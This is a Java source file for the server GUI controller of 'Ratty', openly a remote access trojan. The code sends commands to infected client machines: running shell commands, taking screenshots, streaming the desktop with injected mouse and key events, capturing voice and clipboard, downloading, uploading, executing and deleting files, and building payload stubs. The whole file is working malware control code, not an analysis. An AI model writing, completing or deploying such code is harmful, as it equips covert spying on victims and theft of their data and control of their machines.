package de.sogomn.rat.server.gui;

import java.awt.image.BufferedImage;
import java.io.File;
import java.util.HashMap;
import java.util.Set;

import de.sogomn.rat.ActiveConnection;
import de.sogomn.rat.builder.StubBuilder;
import de.sogomn.rat.packet.AudioPacket;
import de.sogomn.rat.packet.ClipboardPacket;
import de.sogomn.rat.packet.CommandPacket;
import de.sogomn.rat.packet.CreateDirectoryPacket;
import de.sogomn.rat.packet.DeleteFilePacket;
import de.sogomn.rat.packet.DesktopPacket;
import de.sogomn.rat.packet.DownloadFilePacket;
import de.sogomn.rat.packet.ExecuteFilePacket;
import de.sogomn.rat.packet.FileRequestPacket;
import de.sogomn.rat.packet.FreePacket;
import de.sogomn.rat.packet.IPacket;
import de.sogomn.rat.packet.InformationPacket;
import de.sogomn.rat.packet.PopupPacket;
import de.sogomn.rat.packet.ScreenshotPacket;
import de.sogomn.rat.packet.UploadFilePacket;
import de.sogomn.rat.packet.VoicePacket;
import de.sogomn.rat.packet.WebsitePacket;
import de.sogomn.rat.server.AbstractRattyController;
import de.sogomn.rat.server.ActiveServer;
import de.sogomn.rat.util.FrameEncoder.IFrame;

/*
 * Woah, this is a huge class.
 */
public final class RattyGuiController extends AbstractRattyController implements IGuiController {
	
	private RattyGui gui;
	
	private HashMap<ActiveConnection, ServerClient> clients;
	
	public RattyGuiController(final RattyGui gui) {
		this.gui = gui;
		
		clients = new HashMap<ActiveConnection, ServerClient>();
		
		gui.addListener(this);
	}
	
	/*
	 * ==================================================
	 * HANDLING COMMANDS
	 * ==================================================
	 */
	
	private void requestFile(final ServerClient client, final FileTreeNode node) {
		final String path = node.getPath();
		final FileRequestPacket packet = new FileRequestPacket(path);
		
		client.fileTree.removeChildren(node);
		client.connection.addPacket(packet);
	}
	
	private PopupPacket createPopupPacket() {
		final String input = gui.getInput();
		
		if (input != null) {
			final PopupPacket packet = new PopupPacket(input);
			
			return packet;
		}
		
		return null;
	}
	
	private CommandPacket createCommandPacket() {
		final String input = gui.getInput();
		
		if (input != null) {
			final CommandPacket packet = new CommandPacket(input);
			
			return packet;
		}
		
		return null;
	}
	
	private WebsitePacket createWebsitePacket() {
		final String input = gui.getInput();
		
		if (input != null) {
			final WebsitePacket packet = new WebsitePacket(input);
			
			return packet;
		}
		
		return null;
	}
	
	private AudioPacket createAudioPacket() {
		final File file = gui.getFile("WAV");
		final AudioPacket packet = new AudioPacket(file);
		
		return packet;
	}
	
	private DownloadFilePacket createDownloadPacket(final ServerClient client) {
		final FileTreeNode node = client.fileTree.getLastNodeClicked();
		final String path = node.getPath();
		final DownloadFilePacket packet = new DownloadFilePacket(path);
		
		return packet;
	}
	
	private UploadFilePacket createUploadPacket(final ServerClient client) {
		final File file = gui.getFile();
		
		if (file != null) {
			final FileTreeNode node = client.fileTree.getLastNodeClicked();
			final String path = node.getPath();
			final UploadFilePacket packet = new UploadFilePacket(file, path);
			
			return packet;
		}
		
		return null;
	}
	
	private ExecuteFilePacket createExecutePacket(final ServerClient client) {
		final FileTreeNode node = client.fileTree.getLastNodeClicked();
		final String path = node.getPath();
		final ExecuteFilePacket packet = new ExecuteFilePacket(path);
		
		return packet;
	}
	
	private DeleteFilePacket createDeletePacket(final ServerClient client) {
		final FileTreeNode node = client.fileTree.getLastNodeClicked();
		final String path = node.getPath();
		final DeleteFilePacket packet = new DeleteFilePacket(path);
		
		return packet;
	}
	
	private CreateDirectoryPacket createFolderPacket(final ServerClient client) {
		final String input = gui.getInput();
		
		if (input != null) {
			final FileTreeNode node = client.fileTree.getLastNodeClicked();
			final String path = node.getPath();
			final CreateDirectoryPacket packet = new CreateDirectoryPacket(path, input);
			
			return packet;
		}
		
		return null;
	}
	
	private void toggleDesktopStream(final ServerClient client) {
		final boolean streamingDesktop = client.isStreamingDesktop();
		
		client.setStreamingDesktop(!streamingDesktop);
		gui.update();
	}
	
	private void toggleVoiceStream(final ServerClient client) {
		final boolean streamingVoice = client.isStreamingVoice();
		
		client.setStreamingVoice(!streamingVoice);
		gui.update();
	}
	
	private void handleFileTreeCommand(final ServerClient client, final String command) {
		final FileTreeNode node = client.fileTree.getLastNodeClicked();
		final FileTreeNode parent = node.getParent();
		
		if (parent != null && command != FileTree.REQUEST) {
			requestFile(client, parent);
		}
		
		requestFile(client, node);
	}
	
	private void launchAttack() {
		//...
	}
	
	private void handleCommand(final ServerClient client, final String command) {
		if (command == RattyGui.FILES) {
			client.fileTree.setVisible(true);
		} else if (command == RattyGui.DESKTOP) {
			toggleDesktopStream(client);
		} else if (command == RattyGui.VOICE) {
			toggleVoiceStream(client);
		} else if (command == RattyGui.ATTACK) {
			launchAttack();
		} else if (command == RattyGui.BUILD) {
			StubBuilder.start();
		} else if (command == FileTree.NEW_FOLDER || command == FileTree.UPLOAD || command == FileTree.REQUEST || command == FileTree.DELETE) {
			handleFileTreeCommand(client, command);
		}
	}
	
	private IPacket createPacket(final ServerClient client, final String command) {
		IPacket packet = null;
		
		if (command == RattyGui.FREE) {
			packet = new FreePacket();
		} else if (command == RattyGui.POPUP) {
			packet = createPopupPacket();
		} else if (command == RattyGui.CLIPBOARD) {
			packet = new ClipboardPacket();
		} else if (command == RattyGui.COMMAND) {
			packet = createCommandPacket();
		} else if (command == RattyGui.SCREENSHOT) {
			packet = new ScreenshotPacket();
		} else if (command == RattyGui.WEBSITE) {
			packet = createWebsitePacket();
		} else if (command == RattyGui.DESKTOP) {
			packet = new DesktopPacket(true);
		} else if (command == RattyGui.AUDIO) {
			packet = createAudioPacket();
		} else if (command == RattyGui.VOICE) {
			packet = new VoicePacket();
		} else if (command == FileTree.DOWNLOAD) {
			packet = createDownloadPacket(client);
		} else if (command == FileTree.UPLOAD) {
			packet = createUploadPacket(client);
		} else if (command == FileTree.EXECUTE) {
			packet = createExecutePacket(client);
		} else if (command == FileTree.DELETE) {
			packet = createDeletePacket(client);
		} else if (command == FileTree.NEW_FOLDER) {
			packet = createFolderPacket(client);
		} else if (command == DisplayPanel.MOUSE_EVENT && client.isStreamingDesktop()) {
			packet = client.displayPanel.getLastMouseEventPacket();
		} else if (command == DisplayPanel.KEY_EVENT && client.isStreamingDesktop()) {
			packet = client.displayPanel.getLastKeyEventPacket();
		}
		
		return packet;
	}
	
	/*
	 * ==================================================
	 * HANDLING PACKETS
	 * ==================================================
	 */
	
	private void showScreenshot(final ServerClient client, final ScreenshotPacket packet) {
		final BufferedImage image = packet.getImage();
		
		client.displayPanel.showImage(image);
	}
	
	private void handleFiles(final ServerClient client, final FileRequestPacket packet) {
		final String[] paths = packet.getPaths();
		
		for (final String path : paths) {
			client.fileTree.addNodeStructure(path);
		}
	}
	
	private void handleDesktopPacket(final ServerClient client, final DesktopPacket packet) {
		if (!client.isStreamingDesktop()) {
			return;
		}
		
		final IFrame[] frames = packet.getFrames();
		final int screenWidth = packet.getScreenWidth();
		final int screenHeight = packet.getScreenHeight();
		final DesktopPacket request = new DesktopPacket();
		
		client.connection.addPacket(request);
		client.displayPanel.showFrames(frames, screenWidth, screenHeight);
	}
	
	private boolean handlePacket(final ServerClient client, final IPacket packet) {
		final Class<? extends IPacket> clazz = packet.getClass();
		
		boolean consumed = true;
		
		if (clazz == ScreenshotPacket.class) {
			final ScreenshotPacket screenshot = (ScreenshotPacket)packet;
			
			showScreenshot(client, screenshot);
		} else if (clazz == FileRequestPacket.class) {
			final FileRequestPacket request = (FileRequestPacket)packet;
			
			handleFiles(client, request);
		} else if (clazz == DesktopPacket.class) {
			final DesktopPacket desktop = (DesktopPacket)packet;
			
			handleDesktopPacket(client, desktop);
		} else {
			consumed = false;
		}
		
		return consumed;
	}
	
	/*
	 * ==================================================
	 * HANDLING END
	 * ==================================================
	 */
	
	private void logIn(final ServerClient client, final InformationPacket packet) {
		final String name = packet.getName();
		final String os = packet.getOs();
		final String version = packet.getVersion();
		
		client.logIn(name, os, version);
		client.addListener(this);
		
		gui.addRow(client);
	}
	
	@Override
	public void packetReceived(final ActiveConnection connection, final IPacket packet) {
		final ServerClient client = getClient(connection);
		final boolean loggedIn = client.isLoggedIn();
		
		if (loggedIn) {
			final boolean consumed = handlePacket(client, packet);
			
			if (!consumed) {
				packet.execute(connection);
			}
		} else if (packet instanceof InformationPacket) {
			final InformationPacket information = (InformationPacket)packet;
			
			logIn(client, information);
		}
	}
	
	@Override
	public void connected(final ActiveServer server, final ActiveConnection connection) {
		final ServerClient client = new ServerClient(connection);
		
		super.connected(server, connection);
		
		clients.put(connection, client);
	}
	
	@Override
	public void disconnected(final ActiveConnection connection) {
		final ServerClient client = getClient(connection);
		
		gui.removeRow(client);
		
		client.removeListener(this);
		client.setStreamingDesktop(false);
		client.setStreamingVoice(false);
		
		clients.remove(connection);
		
		super.disconnected(connection);
	}
	
	@Override
	public void closed(final ActiveServer server) {
		gui.removeAllListeners();
		
		super.closed(server);
	}
	
	@Override
	public void userInput(final String command) {
		final ServerClient client = gui.getLastServerClientClicked();
		final IPacket packet = createPacket(client, command);
		
		if (packet != null) {
			client.connection.addPacket(packet);
		}
		
		handleCommand(client, command);
	}
	
	public final ServerClient getClient(final ActiveConnection searched) {
		final Set<ActiveConnection> clientSet = clients.keySet();
		
		for (final ActiveConnection connection : clientSet) {
			if (connection == searched) {
				final ServerClient client = clients.get(connection);
				
				return client;
			}
		}
		
		return null;
	}
	
}
